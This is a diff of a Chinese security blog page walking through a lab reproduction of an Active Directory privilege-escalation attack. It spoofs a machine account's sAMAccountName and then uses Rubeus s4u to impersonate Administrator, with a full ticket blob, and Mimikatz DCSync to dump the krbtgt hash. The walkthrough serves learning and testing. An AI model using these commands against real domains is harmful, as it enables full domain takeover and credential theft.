@@ -58,7 +58,7 @@
 <meta property="og:image" content="http://mamor5409.github.io/posts/1fd95242/15.png">
 <meta property="og:image" content="http://mamor5409.github.io/posts/1fd95242/16.png">
 <meta property="article:published_time" content="2021-12-20T12:32:52.000Z">
-<meta property="article:modified_time" content="2022-01-12T08:32:34.428Z">
+<meta property="article:modified_time" content="2022-01-12T08:32:36.000Z">
 <meta property="article:author" content="Mamor">
 <meta property="article:tag" content="内网渗透">
 <meta property="article:tag" content="提权">
@@ -271,7 +271,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-01-12 16:32:34" itemprop="dateModified" datetime="2022-01-12T16:32:34+08:00">2022-01-12</time>
+                <time title="修改时间：2022-01-12 16:32:36" itemprop="dateModified" datetime="2022-01-12T16:32:36+08:00">2022-01-12</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -296,7 +296,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>4.4k</span>
+              <span>4.3k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -326,12 +326,12 @@
 <p>Win2008</p>
 <p>Win2012</p>
 <h3 id="复现踩坑"><a href="#复现踩坑" class="headerlink" title="复现踩坑"></a><em>复现</em>踩坑</h3><h4 id="创建域用户hello"><a href="#创建域用户hello" class="headerlink" title="创建域用户hello"></a>创建域用户hello</h4><p>这里使用一个域内普通用户进行登录  下载Powermad.ps1</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Powermad.ps1</span><br><span class="line">New-MachineAccount -MachineAccount hello -Domain lab.com -DomainController DC01.lab.com -Verbose</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Powermad.ps1</span><br><span class="line">New-MachineAccount -MachineAccount hello -Domain lab.com -DomainController DC01.lab.com -Verbose</span><br></pre></td></tr></table></figure>
 
 <p><img src="/posts/1fd95242/1.png" alt="截图"></p>
 <p><img src="/posts/1fd95242/2.png" alt="截图"></p>
 <p>成功创建用户test</p>
-<h4 id="删除spn记录"><a href="#删除spn记录" class="headerlink" title="删除spn记录"></a>删除spn记录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Powerview.ps1</span><br><span class="line">Set-DomainObject &quot;CN&#x3D;hello,CN&#x3D;Computers,DC&#x3D;lab,DC&#x3D;com&quot;  -Clear &#39;serviceprincipalname&#39; -Verbose</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="删除spn记录"><a href="#删除spn记录" class="headerlink" title="删除spn记录"></a>删除spn记录</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Powerview.ps1</span><br><span class="line">Set-DomainObject &quot;CN=hello,CN=Computers,DC=lab,DC=com&quot;  -Clear &#x27;serviceprincipalname&#x27; -Verbose</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>先用<code>setspn</code>查一下 </p>
 <p><code>setspn -Q */* | findstr hola</code></p>
@@ -348,11 +348,11 @@
 <p><img src="/posts/1fd95242/6.png" alt="截图"></p>
 <br>
 
-<h4 id="重设机器名"><a href="#重设机器名" class="headerlink" title="重设机器名"></a>重设机器名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-MachineAccountAttribute -MachineAccount hello -Value &quot;DC01&quot; -Attribute samaccountname -Verbose</span><br></pre></td></tr></table></figure>
+<h4 id="重设机器名"><a href="#重设机器名" class="headerlink" title="重设机器名"></a>重设机器名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-MachineAccountAttribute -MachineAccount hello -Value &quot;DC01&quot; -Attribute samaccountname -Verbose</span><br></pre></td></tr></table></figure>
 
 <p>改为域控名</p>
 <p><img src="/posts/1fd95242/7.png" alt="截图"></p>
-<h4 id="请求TGT"><a href="#请求TGT" class="headerlink" title="请求TGT"></a>请求TGT</h4><p><del>win2008下使用Rubeus.exe报错…….$#%@&amp;@!#@!…….</del></p>
+<h4 id="请求TGT"><a href="#请求TGT" class="headerlink" title="请求TGT"></a>请求TGT</h4><p><del>win2008下使用Rubeus.exe报错.......$#%@&amp;@!#@!…….</del></p>
 <p><del>去github上下载下来编译一下 然后在win2008上运行 说缺少.net4.0 然后去下载下来安装，结果安装超时了，这台机器的网络…</del></p>
 <p>后面找了个 .net4.5免安装版就可用去使用Rebues。。。。</p>
 <br>
@@ -367,14 +367,14 @@
 <h4 id="恢复原来的机器属性"><a href="#恢复原来的机器属性" class="headerlink" title="恢复原来的机器属性"></a>恢复原来的机器属性</h4><p><img src="/posts/1fd95242/11.png" alt="截图"></p>
 <br>
 
-<h4 id="获取票据"><a href="#获取票据" class="headerlink" title="获取票据"></a>获取票据</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u &#x2F;impersonateuser:Administrator &#x2F;nowrap &#x2F;dc:DC01.lab.com &#x2F;self &#x2F;altservice:LDAP&#x2F;DC01.lab.com  &#x2F;ptt &#x2F;ticket:doIElDCCBJCgAwIBBaEDAgEWooIDvDCCA7hhggO0MIIDsKADAgEFoQkbB0xBQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2xhYi5jb22jggN+MIIDeqADAgESoQMCAQKiggNsBIIDaIW9iHW2Vv1XWw71Yc6V1rdL7m2Mwmzw+rj6X1OQqR1lNapte8JpgGMN&#x2F;EW+0FWCqpkFBYYR0q+ljSY56LIpTNSYK2V4ZEPmBTv&#x2F;iZtG3rvGdHafJxyD3b&#x2F;GfWSVLt3c1Ev7LGf9mUP&#x2F;tDzsxQ46mDgdbUiuB5B7&#x2F;z9vaj7h71J8M2bkIUfeP4xgNcxR5PvLbQsyp6KE54WXRxpreU4ibz8vsplH3i8sKzrPFRM1w7m2XFBonMc1A3oElU16aHwIsDUew60eRa&#x2F;wqAkIl9cmO7d&#x2F;hSux+7aM7ta7Q3+JfnyOYjl0BQMbzK+gDdqtdcgkycjG&#x2F;W&#x2F;+EPbqUHin8wKrY3O8SHix2K1Dq0VIp+GegeiiSlLvk7q+1CixSbo2DxSFAkKDyTUx8YfqSTLzy6scD4Hyi8GSVZCNf2vCTL8KFpSHyPtMURaZitv5YOmBVlK0gq73cKTst6cGzCN0h9XLVOm+RGbjLShOWpsJ4P+9pKLS12PN9EgughEHbCen0Hv2dXLfe+dwDL6Gd5A+TYbsNIyfHrxLhcdu6H1bW6cKSZaXfASM&#x2F;1RyXUA15O0b0y5uh8PpQd82ptvckHkSa2gHqamM08UsUs60H5OPzGRSvtNskOHgFkDYcX6MgKJNFOq+g+J&#x2F;EKchSS0yIc</span><br><span class="line">0iJPCoFLaTCSvlMmq3G5&#x2F;4epI0gjwx6a6oeUTutxc8MfnHL2kAYxW7tgezuDxKVno4LZFVJWKbObrXctu2i16Dr7m5eLgyuKf5UQ41RiOUoTSLQUt4s2gq73&#x2F;NG1MzwRmPq5Z+cWmXDzVual58Mm5W4fipIYqPg88Wnm+&#x2F;WmxYi0ICQgxhJENaZQf3UM0fXKSjTzgVWHkFRfaGx4uaAqzn8MKs4FtCmSf+OVEf7QW0imtvDAsQNixLU8ZTF+OK6rZDs76GB43KUxlhPUTl7NE9kpzlwcef8HiRc4rSsc386&#x2F;NeqsSDjZXgqYcAAQX7v0tNJ0lt+sRrg6GQT7YYHegOMQ9ywBgvdMVAFAzEPMnmW7GhHCOhubxHtDzAEDgkmpM0LXdE27m0acD6XyrRTPdf8slsKD1GliX5iW77L9+qqThwBmb9xRMFgNRFGJDE62g0SlY3+QY1IRpdAUqCuBHKctmeyWemDVBlJWbmqooHwBU3HwOxe8J+TPUevVBko4HDMIHAoAMCAQCigbgEgbV9gbIwga+ggawwgakwgaagGzAZoAMCARehEgQQHKpy33rwHG1c49Aha5Vzp6EJGwdMQUIuQ09NohEwD6ADAgEBoQgwBhsEREMwMaMHAwUAQOEAAKURGA8yMDIxMTIyMTA3MTEwN1qmERgPMjAyMTEyMjExNzExMDdapxEYDzIwMjExMjI4MDcxMTA3WqgJGwdMQUIuQ09NqRwwGqADAgECoRMwERsGa3JidGd0GwdsYWIuY29t</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="获取票据"><a href="#获取票据" class="headerlink" title="获取票据"></a>获取票据</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /impersonateuser:Administrator /nowrap /dc:DC01.lab.com /self /altservice:LDAP/DC01.lab.com  /ptt /ticket:doIElDCCBJCgAwIBBaEDAgEWooIDvDCCA7hhggO0MIIDsKADAgEFoQkbB0xBQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2xhYi5jb22jggN+MIIDeqADAgESoQMCAQKiggNsBIIDaIW9iHW2Vv1XWw71Yc6V1rdL7m2Mwmzw+rj6X1OQqR1lNapte8JpgGMN/EW+0FWCqpkFBYYR0q+ljSY56LIpTNSYK2V4ZEPmBTv/iZtG3rvGdHafJxyD3b/GfWSVLt3c1Ev7LGf9mUP/tDzsxQ46mDgdbUiuB5B7/z9vaj7h71J8M2bkIUfeP4xgNcxR5PvLbQsyp6KE54WXRxpreU4ibz8vsplH3i8sKzrPFRM1w7m2XFBonMc1A3oElU16aHwIsDUew60eRa/wqAkIl9cmO7d/hSux+7aM7ta7Q3+JfnyOYjl0BQMbzK+gDdqtdcgkycjG/W/+EPbqUHin8wKrY3O8SHix2K1Dq0VIp+GegeiiSlLvk7q+1CixSbo2DxSFAkKDyTUx8YfqSTLzy6scD4Hyi8GSVZCNf2vCTL8KFpSHyPtMURaZitv5YOmBVlK0gq73cKTst6cGzCN0h9XLVOm+RGbjLShOWpsJ4P+9pKLS12PN9EgughEHbCen0Hv2dXLfe+dwDL6Gd5A+TYbsNIyfHrxLhcdu6H1bW6cKSZaXfASM/1RyXUA15O0b0y5uh8PpQd82ptvckHkSa2gHqamM08UsUs60H5OPzGRSvtNskOHgFkDYcX6MgKJNFOq+g+J/EKchSS0yIc</span><br><span class="line">0iJPCoFLaTCSvlMmq3G5/4epI0gjwx6a6oeUTutxc8MfnHL2kAYxW7tgezuDxKVno4LZFVJWKbObrXctu2i16Dr7m5eLgyuKf5UQ41RiOUoTSLQUt4s2gq73/NG1MzwRmPq5Z+cWmXDzVual58Mm5W4fipIYqPg88Wnm+/WmxYi0ICQgxhJENaZQf3UM0fXKSjTzgVWHkFRfaGx4uaAqzn8MKs4FtCmSf+OVEf7QW0imtvDAsQNixLU8ZTF+OK6rZDs76GB43KUxlhPUTl7NE9kpzlwcef8HiRc4rSsc386/NeqsSDjZXgqYcAAQX7v0tNJ0lt+sRrg6GQT7YYHegOMQ9ywBgvdMVAFAzEPMnmW7GhHCOhubxHtDzAEDgkmpM0LXdE27m0acD6XyrRTPdf8slsKD1GliX5iW77L9+qqThwBmb9xRMFgNRFGJDE62g0SlY3+QY1IRpdAUqCuBHKctmeyWemDVBlJWbmqooHwBU3HwOxe8J+TPUevVBko4HDMIHAoAMCAQCigbgEgbV9gbIwga+ggawwgakwgaagGzAZoAMCARehEgQQHKpy33rwHG1c49Aha5Vzp6EJGwdMQUIuQ09NohEwD6ADAgEBoQgwBhsEREMwMaMHAwUAQOEAAKURGA8yMDIxMTIyMTA3MTEwN1qmERgPMjAyMTEyMjExNzExMDdapxEYDzIwMjExMjI4MDcxMTA3WqgJGwdMQUIuQ09NqRwwGqADAgECoRMwERsGa3JidGd0GwdsYWIuY29t</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p><del>这里不管使用cmd 还是powershell  命令太长了被分成了两个……？？？</del></p>
 <p>额 居然是在复制时候 太长notepad给自己换行了</p>
 <p><img src="/posts/1fd95242/12.png" alt="截图"></p>
 <br>
 
-<h4 id="获取krbtgt用户的NTLM-Hash"><a href="#获取krbtgt用户的NTLM-Hash" class="headerlink" title="获取krbtgt用户的NTLM Hash"></a>获取krbtgt用户的NTLM Hash</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync &#x2F;user:lab\krbtgt</span><br></pre></td></tr></table></figure>
+<h4 id="获取krbtgt用户的NTLM-Hash"><a href="#获取krbtgt用户的NTLM-Hash" class="headerlink" title="获取krbtgt用户的NTLM Hash"></a>获取krbtgt用户的NTLM Hash</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /user:lab\krbtgt</span><br></pre></td></tr></table></figure>
 
 <p><img src="/posts/1fd95242/13.png" alt="截图"></p>
 <br>
@@ -560,7 +560,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">177</span>
+          <span class="site-state-item-count">176</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -573,7 +573,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">52</span>
+        <span class="site-state-item-count">51</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -617,12 +617,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">1m</span>
+    <span title="站点总字数">984k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">15:11</span>
+    <span title="站点阅读时长">14:55</span>
 </div>
 
 <!--
@@ -633,7 +633,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共221.6k字</span>
+  <span class="post-count">博客全站共218.1k字</span>
 </div>
 -->
         
